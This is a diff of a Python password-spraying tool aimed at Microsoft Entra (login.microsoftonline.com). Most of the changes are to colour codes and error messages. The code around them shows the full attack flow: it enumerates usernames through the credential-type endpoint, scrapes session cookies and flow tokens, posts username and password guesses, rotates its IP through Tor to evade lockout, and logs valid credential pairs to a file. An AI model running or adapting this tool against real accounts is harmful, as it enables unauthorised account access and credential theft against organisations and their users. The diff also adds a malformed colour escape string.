@@ -8,12 +8,17 @@ import argparse
 import getpass
 import os
 
-GREEN = "\033[92m"
-RED = "\033[91m"
+
 RESET = "\033[0m"
 YELLOW = "\033[93m"
-BLUE = "\033[94m"
-CYAN = "\033[96m"
+CYAN = "\033[36m[36m]"
+BOLD_YELLOW = "\033[1;33m"
+BOLD_BLACK = "\033[1;31m"
+BOLD_GREEN = "\033[1;33m"
+BOLD_RED = "\033[1;31m"
+BACKGROUNG_YELLOW = "\033[43m"
+BACKGROUNG_CYAN = "\033[46m"
+
 
 
 def load_list(input_str):
@@ -26,20 +31,16 @@ def load_list(input_str):
 parser = argparse.ArgumentParser(
     description="Spray or test Microsoft login using username(s) and password(s).",
     epilog="Example usage:\n"
-           "  python3 Entrra-Spray.py -user users.txt -pass passwords.txt\n"
-           "  python3 Entrra-Spray.py -user username@domain.com -pass 'X' -check\n"
-           "  python3 Entrra-Spray.py -user u@d.com -pass 'X' -check -proxytor",
+           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' \n"
+           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' -check \n"
+           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' -proxytor \n",
     formatter_class=argparse.RawTextHelpFormatter
 )
 
 parser.add_argument("-user", required=True, help="Single username or path to usernames file (TXT)")
 parser.add_argument("-pass", dest="password", required=True, help="Single password or path to passwords file (TXT)")
 parser.add_argument("-check", action="store_true", help="Enable check mode (check if Identity exists in Entra - May return false positives)")
-parser.add_argument(
-    "-proxytor",
-    action="store_true",
-    help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 7 minutes."
-)
+parser.add_argument("-proxytor", action="store_true", help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 7 minutes.")
 
 args = parser.parse_args()
 
@@ -52,9 +53,9 @@ def get_tor_ip():
     try:
         with httpx.Client(transport=transport, timeout=20) as client:
             ip = client.get("https://check.torproject.org/api/ip").text.strip()
-            print(f"{BLUE}[i] Current TOR IP: {ip}{RESET}")
+            print(f"{YELLOW}[i] Current TOR IP: {ip}{RESET}")
     except Exception as e:
-        print(f"{RED}[✗] Could not retrieve TOR IP: {e}{RESET}")
+        print(f"{BOLD_BLACK}[✗] Could not retrieve TOR IP: {e}{RESET}")
 
 def renew_tor_ip():
     global last_ip_renewal
@@ -63,10 +64,10 @@ def renew_tor_ip():
             controller.authenticate()
             controller.signal(stem.Signal.NEWNYM)
             last_ip_renewal = time.time()
-            print(f"{BLUE}[✓] Renewed TOR IP{RESET}")
+            print(f"{BOLD_YELLOW}[✓] Renewed TOR IP{RESET}")
             get_tor_ip()
     except Exception as e:
-        print(f"{RED}[✗] Failed to renew TOR IP: {e}{RESET}")
+        print(f"{BOLD_BLACK}[✗] Failed to renew TOR IP: {e}{RESET}")
 
 if args.proxytor:
     last_ip_renewal = time.time()
@@ -124,11 +125,11 @@ for username in usernames:
                         print(f"{var_name}: not found")
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_login}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
             
             
             #Sec action - Getting 2 urls (with proxy):
@@ -158,11 +159,11 @@ for username in usernames:
                 cookie_header = cookie_header.strip().rstrip(";")
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_geturls}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
 
 
             #third action - Getting Cookies and Body Parametrs from url1+url2 (with proxy):
@@ -217,11 +218,11 @@ for username in usernames:
                 flowtoken = match_flow.group(1) if match_flow else None
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url1} and {url2}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
             
             
             #Check id User Exist (with proxy):
@@ -255,12 +256,12 @@ for username in usernames:
                         with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                             response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                             if '"FederationRedirectUrl"' in response_UserExsit.text:
-                                print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
+                                print(f"{BACKGROUNG_YELLOW}[!] Can not enumeration if username is exist {RESET}")
                                 continue
                             if '"IfExistsResult":0' in response_UserExsit.text:
                                 pass
                             else:
-                                print(f"{RED}[✗] Username: {username} not exists{RESET}")
+                                print(f"{BOLD_RED}[✗] Username: {username} not exists{RESET}")
                                 continue
                                 
                     except httpx.ReadTimeout:
@@ -272,11 +273,11 @@ for username in usernames:
                         continue
         
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_UserExsit}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                 
             
              #Final Request - POST with username and password (with proxy):
@@ -317,51 +318,51 @@ for username in usernames:
                         cookies_dict = dict(response_check_password.cookies)
                         if args.check:
                             if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
+                                print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break            
                             else:
                                 if "<html><head><title>Working...</title></head>" in response_check_password.text:
-                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
+                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}:{password}\n")
                                     break
                                 else:
-                                    print(f"{BLUE}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}")
+                                    print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}\n")
                                     
                         else :
                             if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
+                                print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break            
                             else:
                                 if "<html><head><title>Working...</title></head>" in response_check_password.text:
-                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
+                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}:{password}\n")
                                     break
                                 else:
-                                    print(f"{YELLOW}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists")   
+                                    print(f"{BOLD_RED}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
 
                 except httpx.ReadTimeout:
-                    print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
+                    print(f"{BOLD_BLACK}[✗] Request timed out while checking user: {username}{RESET}")
                     continue
 
                 except httpx.RequestError as e:
-                    print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
+                    print(f"{BOLD_BLACK}[✗] Request error for {username}: {e}{RESET}")
                     continue
                
             
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_check_password}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_check_password} {RESET}")
             
             
         else :
@@ -392,7 +393,6 @@ for username in usernames:
                     response_login = client.get(url_login)
                     cookies_dict_login = dict(response_login.cookies)
                     cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
-
                     for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
                         globals()[f"cookie_login{i}"] = cookie_login
                         #print(f"Var Created: cookie{i} = {{'name': '{cookie['name']}', 'value': '{cookie['value']}'}}")
@@ -405,11 +405,11 @@ for username in usernames:
                         print(f"{var_name}: not found")
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url_login}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_login}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
             
             
             #Sec action - Getting 2 urls:
@@ -428,6 +428,7 @@ for username in usernames:
                         
                 url1 = location + "&sso_reload=true"
                 url2 = location
+                
                 cookie_header = ""
                 for i in range(1, 20):  
                     var_name = f"cookie_login{i}"
@@ -438,11 +439,11 @@ for username in usernames:
                 cookie_header = cookie_header.strip().rstrip(";")
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_geturls}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
 
 
             #third action - Getting Cookies and Body Parametrs from url1+url2:
@@ -497,11 +498,11 @@ for username in usernames:
                 flowtoken = match_flow.group(1) if match_flow else None
 
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url1} and {url2}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
             
             
             #Check id User Exist:
@@ -535,12 +536,12 @@ for username in usernames:
                         with httpx.Client(timeout=20, http2=True ) as client:
                             response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
                             if '"FederationRedirectUrl"' in response_UserExsit.text:
-                                print(f"{BLUE}[!] Can not enumeration if username is exist {RESET}")
+                                print(f"{BACKGROUNG_YELLOW}[!] Can not enumeration if username is exist {RESET}")
                                 continue
                             if '"IfExistsResult":0' in response_UserExsit.text:
                                 pass
                             else:
-                                print(f"{RED}[✗] Username: {username} not exists{RESET}")
+                                print(f"{BOLD_RED}[✗] Username: {username} not exists{RESET}")
                                 continue
                                 
                     except httpx.ReadTimeout:
@@ -552,14 +553,14 @@ for username in usernames:
                         continue
         
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_UserExsit}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                 
             
-             #Final Request - POST with username and password
+             #Final Request - POST with username and password:
             url_check_password = "https://login.microsoftonline.com/common/login"
             headers_check_password = {
                 "Host": "login.microsoftonline.com",
@@ -597,51 +598,54 @@ for username in usernames:
                         cookies_dict = dict(response_check_password.cookies)
                         if args.check:
                             if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
+                                print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break            
                             else:
                                 if "<html><head><title>Working...</title></head>" in response_check_password.text:
-                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
+                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}:{password}\n")
                                     break
                                 else:
-                                    print(f"{BLUE}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
+                                    print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}\n")
                                     
                         else :
                             if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
+                                print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break            
                             else:
                                 if "<html><head><title>Working...</title></head>" in response_check_password.text:
-                                    print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
+                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
                                     with open("valid-users.txt", "a") as log_file:
                                         log_file.write(f"{username}:{password}\n")
                                     break
                                 else:
-                                    print(f"{YELLOW}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
+                                    print(f"{BOLD_RED}[-] Failed to authenticate with {username} with password {password}, didn't check if user exists{RESET}")   
 
                 except httpx.ReadTimeout:
-                    print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
+                    print(f"{BOLD_BLACK}[✗] Request timed out while checking user: {username}{RESET}")
                     continue
 
                 except httpx.RequestError as e:
-                    print(f"{RED}[✗] Request error for {username}: {e}{RESET}")
+                    print(f"{BOLD_BLACK}[✗] Request error for {username}: {e}{RESET}")
                     continue
                
             
             except httpx.ReadTimeout:
-                print(f"{RED}[✗] Timeout occurred while connecting to {url1}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Timeout occurred while connecting to {url_check_password}{RESET}")
             except httpx.RequestError as e:
-                print(f"{RED}[✗] Request error: {e}{RESET}")
+                print(f"{BOLD_BLACK}[✗] Request error: {e}{RESET}")
             except Exception:
-                print(f"{RED}[✗] Unexpected error occurred{RESET}")
-            
-             
-print(f"{CYAN} seccess Logs written to valid-users.txt {RESET}")
+                print(f"{BOLD_BLACK}[✗] Unexpected error occurred while connecting to {url_check_password} {RESET}")
+
+print("")
+print("")           
+print("----------------------------")
+print(f"{BACKGROUNG_CYAN} Valid users and seccessfully logged in written to valid-users.txt {RESET}")
+print("")
